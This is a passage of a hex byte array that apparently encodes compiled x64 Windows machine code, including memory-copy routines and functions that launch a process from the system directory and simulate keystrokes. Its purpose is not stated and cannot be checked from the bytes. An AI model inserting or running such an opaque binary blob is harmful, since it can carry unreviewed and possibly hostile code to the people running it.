	0x2E, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x03, 0x0E, 0x00, 0x00, 0x48, 0x85, 0xC0,
	0x75, 0x17, 0xBA, 0x5D, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xF0, 0x0D, 0x00, 0x00,
	0x48, 0x85, 0xC0, 0x0F, 0x84, 0x20, 0x01, 0x00, 0x00, 0xBF, 0x09, 0x00, 0x00, 0x00, 0x33, 0xD2,
	0x8B, 0xCF, 0xE8, 0xBD, 0xFE, 0xFF, 0xFF, 0x8B, 0xCF, 0x33, 0xD2, 0xE8, 0xB4, 0xFE, 0xFF, 0xFF,
	0x8D, 0x4F, 0x04, 0x33, 0xD2, 0xE8, 0xAA, 0xFE, 0xFF, 0xFF, 0xB9, 0xE8, 0x03, 0x00, 0x00, 0xFF,
	0x15, 0x23, 0x0D, 0x00, 0x00, 0xFF, 0x15, 0xCD, 0x0D, 0x00, 0x00, 0x41, 0xB8, 0x04, 0x01, 0x00,
	0x00, 0x89, 0xAC, 0x24, 0x60, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0x8D, 0x54, 0x24, 0x20,
	0x48, 0x8B, 0xF8, 0xFF, 0x15, 0x9F, 0x0D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xC4, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x15, 0x28, 0x11, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x02, 0xF2,
	0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x85, 0xAB, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x68, 0x02,
	0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xBD, 0x0D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x92,
	0x00, 0x00, 0x00, 0x8B, 0x8C, 0x24, 0x68, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x60, 0x02,
	0x00, 0x00, 0xE8, 0x89, 0xEA, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x7A, 0x39, 0xAC, 0x24, 0x60, 0x02,
	0x00, 0x00, 0x74, 0x71, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xC0, 0x10, 0x00, 0x00,
	0xFF, 0x15, 0x4A, 0x0D, 0x00, 0x00, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xF0, 0x48, 0x8B, 0xD3, 0x48,
	0x8B, 0xFD, 0x48, 0x85, 0xDB, 0x74, 0x42, 0x66, 0x39, 0x2B, 0x74, 0x09, 0x48, 0x83, 0xC2, 0x02,
	0x66, 0x39, 0x2A, 0x75, 0xF7, 0x48, 0x2B, 0xD3, 0x48, 0xD1, 0xFA, 0x48, 0x3B, 0xFA, 0x73, 0x29,
	0x0F, 0xB7, 0x0C, 0x4B, 0x48, 0x8B, 0xD6, 0xFF, 0x15, 0x2B, 0x0D, 0x00, 0x00, 0x0F, 0xB7, 0xD0,
	0xC1, 0xEA, 0x08, 0x83, 0xE2, 0x01, 0x0F, 0xB6, 0xC8, 0xE8, 0xC6, 0xFD, 0xFF, 0xFF, 0x48, 0xFF,
	0xC7, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xCF, 0xEB, 0xBE, 0xB9, 0x0D, 0x00, 0x00, 0x00, 0x33, 0xD2,
	0xE8, 0xAF, 0xFD, 0xFF, 0xFF, 0x33, 0xC0, 0xEB, 0x05, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x9C, 0x24, 0x50, 0x02, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x30, 0x02, 0x00, 0x00, 0x5F, 0x5E, 0x5D,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x18, 0x57,
	0x48, 0x81, 0xEC, 0x30, 0x04, 0x00, 0x00, 0x8B, 0x5A, 0x08, 0x48, 0x8B, 0xF2, 0x48, 0x8D, 0x50,
	0x10, 0x48, 0x8B, 0xF9, 0xFF, 0x15, 0xDE, 0x0C, 0x00, 0x00, 0x39, 0x9C, 0x24, 0x48, 0x04, 0x00,
	0x00, 0x75, 0x32, 0x41, 0xB8, 0x04, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B,
	0xCF, 0xFF, 0x15, 0x71, 0x0C, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x1A, 0x48, 0x8D, 0x15, 0x56, 0x10,
	0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xD8, 0xF0, 0xFF, 0xFF, 0x85, 0xC0, 0x75, 0x05,
	0x48, 0x89, 0x3E, 0xEB, 0x05, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0x30, 0x04,
	0x00, 0x00, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x73, 0x20, 0x49, 0x8B, 0xE3, 0x5F, 0xC3, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x7C, 0x24, 0x10, 0x55, 0x48, 0x8D, 0xAC, 0x24, 0x10,
	0xFC, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xF0, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xD9, 0xBA, 0x30, 0x00,
	0xFE, 0x7F, 0x48, 0x8D, 0x4D, 0xE0, 0xE8, 0xF9, 0xF0, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x06, 0x10,
	0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE0, 0xE8, 0x3D, 0xF0, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x0E, 0x10,
	0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE0, 0xE8, 0x2D, 0xF0, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8D, 0x7C,
	0x24, 0x40, 0x8D, 0x50, 0x70, 0x8B, 0xCA, 0xF3, 0xAA, 0x48, 0x8D, 0x45, 0xE0, 0x89, 0x54, 0x24,
	0x40, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0x48, 0x8D, 0x05, 0xFA, 0x0F,
	0x00, 0x00, 0xC7, 0x44, 0x24, 0x44, 0x40, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0xC7,
	0x44, 0x24, 0x70, 0x05, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x8B, 0x0B, 0x00, 0x00, 0x85, 0xC0, 0x0F,
	0x84, 0x89, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x7D, 0xB0, 0x4C, 0x8D, 0x45, 0xB0, 0x48,
	0x89, 0x44, 0x24, 0x20, 0x33, 0xD2, 0x44, 0x8D, 0x48, 0x30, 0x41, 0x8B, 0xC9, 0xF3, 0xAA, 0x48,
	0x8B, 0x4D, 0xA8, 0xFF, 0x15, 0x4F, 0x0C, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x4B, 0xB9, 0xE8, 0x03,
	0x00, 0x00, 0xFF, 0x15, 0xD0, 0x0A, 0x00, 0x00, 0x8B, 0x45, 0xD0, 0x48, 0x8D, 0x54, 0x24, 0x30,
	0x48, 0x8D, 0x0D, 0xAD, 0xFE, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x38, 0x48, 0xC7, 0x44, 0x24, 0x30,
	0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xBE, 0x0B, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B,
	0x4C, 0x24, 0x30, 0x48, 0x85, 0xC9, 0x74, 0x10, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x15, 0xD2, 0xFC,
	0xFF, 0xFF, 0xFF, 0x15, 0x50, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0xA8, 0x33, 0xD2, 0xFF, 0x15,
	0x9C, 0x0A, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0xA8, 0xFF, 0x15, 0x3A, 0x0A, 0x00, 0x00, 0x4C, 0x8D,
	0x9C, 0x24, 0xF0, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x7B, 0x18, 0x49, 0x8B,
	0xE3, 0x5D, 0xC3, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x78, 0x10, 0x4C,
	0x89, 0x70, 0x18, 0x55, 0x48, 0x8D, 0xA8, 0x28, 0xFC, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xD0, 0x04,
	0x00, 0x00, 0xBA, 0x30, 0x00, 0xFE, 0x7F, 0x48, 0x8D, 0x4D, 0xC0, 0xBB, 0x05, 0x00, 0x00, 0x00,
	0xE8, 0xBF, 0xEF, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xCC, 0x0E, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xC0,
	0xE8, 0x03, 0xEF, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xFC, 0x0E, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xC0,
	0xE8, 0xF3, 0xEE, 0xFF, 0xFF, 0x33, 0xC0, 0x44, 0x8D, 0x73, 0x6B, 0x41, 0x8B, 0xCE, 0x48, 0x8D,
	0x7C, 0x24, 0x50, 0xF3, 0xAA, 0x48, 0x8D, 0x45, 0xC0, 0x44, 0x89, 0x74, 0x24, 0x50, 0x48, 0x89,
	0x44, 0x24, 0x68, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x48, 0x8D, 0x05, 0xD9, 0x0E, 0x00, 0x00, 0xC7,
	0x44, 0x24, 0x54, 0x40, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70, 0x89, 0x5D, 0x80, 0xFF,
	0x15, 0x53, 0x0A, 0x00, 0x00, 0x33, 0xFF, 0x85, 0xC0, 0x74, 0x76, 0x33, 0xD2, 0x48, 0x8D, 0x0D,
	0xD4, 0x0E, 0x00, 0x00, 0xFF, 0x15, 0x66, 0x0A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x12, 0xB9,
	0xE8, 0x03, 0x00, 0x00, 0xFF, 0x15, 0xAE, 0x09, 0x00, 0x00, 0x83, 0xC3, 0xFF, 0x75, 0xDC, 0xEB,
	0x3A, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x2E, 0x0A, 0x00, 0x00, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x4C,
	0x89, 0x74, 0x24, 0x28, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x89, 0x4C, 0x24, 0x20, 0x89, 0x7C, 0x24,
	0x30, 0x48, 0x89, 0x7C, 0x24, 0x38, 0x44, 0x8D, 0x41, 0x27, 0xFF, 0x15, 0x90, 0x0A, 0x00, 0x00,
	0xB9, 0xE8, 0x03, 0x00, 0x00, 0xFF, 0x15, 0x6D, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0xB8, 0x33,
	0xD2, 0xFF, 0x15, 0x79, 0x09, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0xB8, 0xFF, 0x15, 0x17, 0x09, 0x00,
	0x00, 0x4C, 0x8D, 0x9C, 0x24, 0xD0, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x7B,
	0x18, 0x4D, 0x8B, 0x73, 0x20, 0x49, 0x8B, 0xE3, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x57, 0x56, 0x48, 0x8B, 0xF9, 0x48, 0x8B, 0xF2, 0x49, 0x8B, 0xC8, 0xF3, 0xA4, 0x5E, 0x5F, 0xC3,
	0x48, 0x8B, 0xC1, 0x4C, 0x8D, 0x15, 0x66, 0xC8, 0xFF, 0xFF, 0x49, 0x83, 0xF8, 0x0F, 0x0F, 0x87,
	0x0C, 0x01, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x47, 0x8B, 0x8C, 0x82, 0x00, 0x46, 0x00, 0x00, 0x4D, 0x03, 0xCA, 0x41, 0xFF, 0xE1, 0xC3, 0x90,
	0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F, 0xB7, 0x4A, 0x0C, 0x44, 0x0F, 0xB6, 0x52, 0x0E,
	0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0x66, 0x44, 0x89, 0x48, 0x0C, 0x44, 0x88, 0x50, 0x0E, 0xC3,
	0x4C, 0x8B, 0x02, 0x0F, 0xB7, 0x4A, 0x08, 0x44, 0x0F, 0xB6, 0x4A, 0x0A, 0x4C, 0x89, 0x00, 0x66,
	0x89, 0x48, 0x08, 0x44, 0x88, 0x48, 0x0A, 0xC3, 0x0F, 0xB7, 0x0A, 0x66, 0x89, 0x08, 0xC3, 0x90,
	0x8B, 0x0A, 0x44, 0x0F, 0xB7, 0x42, 0x04, 0x44, 0x0F, 0xB6, 0x4A, 0x06, 0x89, 0x08, 0x66, 0x44,
	0x89, 0x40, 0x04, 0x44, 0x88, 0x48, 0x06, 0xC3, 0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F,
	0xB7, 0x4A, 0x0C, 0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0x66, 0x44, 0x89, 0x48, 0x0C, 0xC3, 0x0F,
	0xB7, 0x0A, 0x44, 0x0F, 0xB6, 0x42, 0x02, 0x66, 0x89, 0x08, 0x44, 0x88, 0x40, 0x02, 0xC3, 0x90,
	0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x44, 0x0F, 0xB6, 0x4A, 0x0C, 0x4C, 0x89, 0x00, 0x89, 0x48,
	0x08, 0x44, 0x88, 0x48, 0x0C, 0xC3, 0x4C, 0x8B, 0x02, 0x0F, 0xB7, 0x4A, 0x08, 0x4C, 0x89, 0x00,
	0x66, 0x89, 0x48, 0x08, 0xC3, 0x4C, 0x8B, 0x02, 0x0F, 0xB6, 0x4A, 0x08, 0x4C, 0x89, 0x00, 0x88,
	0x48, 0x08, 0xC3, 0x4C, 0x8B, 0x02, 0x8B, 0x4A, 0x08, 0x4C, 0x89, 0x00, 0x89, 0x48, 0x08, 0xC3,
	0x8B, 0x0A, 0x44, 0x0F, 0xB7, 0x42, 0x04, 0x89, 0x08, 0x66, 0x44, 0x89, 0x40, 0x04, 0xC3, 0x8B,
	0x0A, 0x44, 0x0F, 0xB6, 0x42, 0x04, 0x89, 0x08, 0x44, 0x88, 0x40, 0x04, 0xC3, 0x48, 0x8B, 0x0A,
	0x48, 0x89, 0x08, 0xC3, 0x0F, 0xB6, 0x0A, 0x88, 0x08, 0xC3, 0x8B, 0x0A, 0x89, 0x08, 0xC3, 0x90,
	0x49, 0x83, 0xF8, 0x20, 0x77, 0x17, 0xF3, 0x0F, 0x6F, 0x0A, 0xF3, 0x42, 0x0F, 0x6F, 0x54, 0x02,
	0xF0, 0xF3, 0x0F, 0x7F, 0x09, 0xF3, 0x42, 0x0F, 0x7F, 0x54, 0x01, 0xF0, 0xC3, 0x4E, 0x8D, 0x0C,
	0x02, 0x48, 0x3B, 0xCA, 0x4C, 0x0F, 0x46, 0xC9, 0x49, 0x3B, 0xC9, 0x0F, 0x82, 0x3F, 0x04, 0x00,
	0x00, 0x83, 0x3D, 0x20, 0x47, 0x00, 0x00, 0x03, 0x0F, 0x82, 0xE2, 0x02, 0x00, 0x00, 0x49, 0x81,
	0xF8, 0x00, 0x20, 0x00, 0x00, 0x76, 0x16, 0x49, 0x81, 0xF8, 0x00, 0x00, 0x18, 0x00, 0x77, 0x0D,
	0xF6, 0x05, 0x1D, 0x47, 0x00, 0x00, 0x02, 0x0F, 0x85, 0x73, 0xFE, 0xFF, 0xFF, 0xC5, 0xFE, 0x6F,
	0x02, 0xC4, 0xA1, 0x7E, 0x6F, 0x6C, 0x02, 0xE0, 0x49, 0x81, 0xF8, 0x00, 0x01, 0x00, 0x00, 0x0F,
	0x86, 0xC3, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC9, 0x49, 0x83, 0xE1, 0x1F, 0x49, 0x83, 0xE9, 0x20,
	0x49, 0x2B, 0xC9, 0x49, 0x2B, 0xD1, 0x4D, 0x03, 0xC1, 0x49, 0x81, 0xF8, 0x00, 0x01, 0x00, 0x00,
	0x0F, 0x86, 0xA2, 0x00, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x00, 0x18, 0x00, 0x0F, 0x87, 0x3D,
	0x01, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC5, 0xFE, 0x6F, 0x0A, 0xC5, 0xFE, 0x6F, 0x52, 0x20, 0xC5, 0xFE, 0x6F, 0x5A, 0x40, 0xC5, 0xFE,
	0x6F, 0x62, 0x60, 0xC5, 0xFD, 0x7F, 0x09, 0xC5, 0xFD, 0x7F, 0x51, 0x20, 0xC5, 0xFD, 0x7F, 0x59,
	0x40, 0xC5, 0xFD, 0x7F, 0x61, 0x60, 0xC5, 0xFE, 0x6F, 0x8A, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0x92, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFE, 0x6F, 0x9A, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0xA2, 0xE0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0x7F, 0x89, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0x7F, 0x91, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0x7F, 0x99, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0x7F, 0xA1, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC1, 0x00, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC2,
	0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x01,
	0x00, 0x00, 0x0F, 0x83, 0x78, 0xFF, 0xFF, 0xFF, 0x4D, 0x8D, 0x48, 0x1F, 0x49, 0x83, 0xE1, 0xE0,
	0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x05, 0x47, 0x8B, 0x9C, 0x9A, 0x40, 0x46, 0x00, 0x00, 0x4D,
	0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x00, 0xFF, 0xFF, 0xFF, 0xC4,
	0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x00, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x20,
	0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x20, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E,
	0x6F, 0x8C, 0x0A, 0x40, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x40, 0xFF, 0xFF,
	0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C,
	0x09, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0x80, 0xC4, 0xA1, 0x7E, 0x7F,
	0x4C, 0x09, 0x80, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xA0, 0xC4, 0xA1, 0x7E, 0x7F, 0x4C, 0x09,
	0xA0, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xC0, 0xC4, 0xA1, 0x7E, 0x7F, 0x4C, 0x09, 0xC0, 0xC4,
	0xA1, 0x7E, 0x7F, 0x6C, 0x01, 0xE0, 0xC5, 0xFE, 0x7F, 0x00, 0xC5, 0xF8, 0x77, 0xC3, 0x66, 0x90,
	0xC5, 0xFE, 0x6F, 0x0A, 0xC5, 0xFE, 0x6F, 0x52, 0x20, 0xC5, 0xFE, 0x6F, 0x5A, 0x40, 0xC5, 0xFE,
	0x6F, 0x62, 0x60, 0xC5, 0xFD, 0xE7, 0x09, 0xC5, 0xFD, 0xE7, 0x51, 0x20, 0xC5, 0xFD, 0xE7, 0x59,
	0x40, 0xC5, 0xFD, 0xE7, 0x61, 0x60, 0xC5, 0xFE, 0x6F, 0x8A, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0x92, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFE, 0x6F, 0x9A, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0xA2, 0xE0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0xE7, 0x89, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0xE7, 0x91, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0xE7, 0x99, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0xE7, 0xA1, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC1, 0x00, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC2,
	0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x01,
	0x00, 0x00, 0x0F, 0x83, 0x78, 0xFF, 0xFF, 0xFF, 0x4D, 0x8D, 0x48, 0x1F, 0x49, 0x83, 0xE1, 0xE0,
	0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x05, 0x47, 0x8B, 0x9C, 0x9A, 0x64, 0x46, 0x00, 0x00, 0x4D,
	0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x00, 0xFF, 0xFF, 0xFF, 0xC4,
	0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x00, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x20,
	0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x20, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E,
	0x6F, 0x8C, 0x0A, 0x40, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x40, 0xFF, 0xFF,
	0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C,
	0x09, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0x80, 0xC4, 0xA1, 0x7D, 0xE7,
	0x4C, 0x09, 0x80, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xA0, 0xC4, 0xA1, 0x7D, 0xE7, 0x4C, 0x09,
	0xA0, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xC0, 0xC4, 0xA1, 0x7D, 0xE7, 0x4C, 0x09, 0xC0, 0xC4,
	0xA1, 0x7E, 0x7F, 0x6C, 0x01, 0xE0, 0xC5, 0xFE, 0x7F, 0x00, 0x0F, 0xAE, 0xF8, 0xC5, 0xF8, 0x77,
	0xC3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x49, 0x81, 0xF8, 0x00, 0x08, 0x00, 0x00, 0x76, 0x0D, 0xF6, 0x05, 0x44, 0x44, 0x00, 0x00, 0x02,
	0x0F, 0x85, 0x9A, 0xFB, 0xFF, 0xFF, 0xF3, 0x0F, 0x6F, 0x02, 0xF3, 0x42, 0x0F, 0x6F, 0x6C, 0x02,
	0xF0, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x86, 0x8E, 0x00, 0x00, 0x00, 0x4C, 0x8B,
	0xC9, 0x49, 0x83, 0xE1, 0x0F, 0x49, 0x83, 0xE9, 0x10, 0x49, 0x2B, 0xC9, 0x49, 0x2B, 0xD1, 0x4D,
	0x03, 0xC1, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x76, 0x71, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0xF3, 0x0F, 0x6F, 0x0A, 0xF3, 0x0F, 0x6F, 0x52, 0x10, 0xF3, 0x0F, 0x6F, 0x5A, 0x20, 0xF3, 0x0F,
	0x6F, 0x62, 0x30, 0x66, 0x0F, 0x7F, 0x09, 0x66, 0x0F, 0x7F, 0x51, 0x10, 0x66, 0x0F, 0x7F, 0x59,
	0x20, 0x66, 0x0F, 0x7F, 0x61, 0x30, 0xF3, 0x0F, 0x6F, 0x4A, 0x40, 0xF3, 0x0F, 0x6F, 0x52, 0x50,
	0xF3, 0x0F, 0x6F, 0x5A, 0x60, 0xF3, 0x0F, 0x6F, 0x62, 0x70, 0x66, 0x0F, 0x7F, 0x49, 0x40, 0x66,
	0x0F, 0x7F, 0x51, 0x50, 0x66, 0x0F, 0x7F, 0x59, 0x60, 0x66, 0x0F, 0x7F, 0x61, 0x70, 0x48, 0x81,
	0xC1, 0x80, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC2, 0x80, 0x00, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x80,
	0x00, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x73, 0x94, 0x4D, 0x8D, 0x48, 0x0F,
	0x49, 0x83, 0xE1, 0xF0, 0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x04, 0x47, 0x8B, 0x9C, 0x9A, 0x88,
	0x46, 0x00, 0x00, 0x4D, 0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0x80,
	0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0x80, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0x90, 0xF3, 0x42,
	0x0F, 0x7F, 0x4C, 0x09, 0x90, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xA0, 0xF3, 0x42, 0x0F, 0x7F,
	0x4C, 0x09, 0xA0, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xB0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09,
	0xB0, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xC0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xC0, 0xF3,
	0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xD0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xD0, 0xF3, 0x42, 0x0F,
	0x6F, 0x4C, 0x0A, 0xE0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xE0, 0xF3, 0x42, 0x0F, 0x7F, 0x6C,
	0x01, 0xF0, 0xF3, 0x0F, 0x7F, 0x00, 0xC3, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x10, 0x12, 0x48, 0x2B, 0xD1, 0x49, 0x03, 0xC8, 0x0F, 0x10, 0x44, 0x11, 0xF0, 0x48, 0x83,
	0xE9, 0x10, 0x49, 0x83, 0xE8, 0x10, 0xF6, 0xC1, 0x0F, 0x74, 0x18, 0x4C, 0x8B, 0xC9, 0x48, 0x83,
	0xE1, 0xF0, 0x0F, 0x10, 0xC8, 0x0F, 0x10, 0x04, 0x11, 0x41, 0x0F, 0x11, 0x09, 0x4C, 0x8B, 0xC1,
	0x4C, 0x2B, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x07, 0x74, 0x71, 0x0F, 0x29, 0x01, 0xEB,
	0x16, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x29, 0x41, 0x10, 0x0F, 0x29, 0x09, 0x0F, 0x10, 0x44, 0x11, 0xF0, 0x0F, 0x10, 0x4C, 0x11,
	0xE0, 0x48, 0x81, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x41, 0x70, 0x0F, 0x29, 0x49, 0x60,
	0x0F, 0x10, 0x44, 0x11, 0x50, 0x0F, 0x10, 0x4C, 0x11, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29, 0x41,
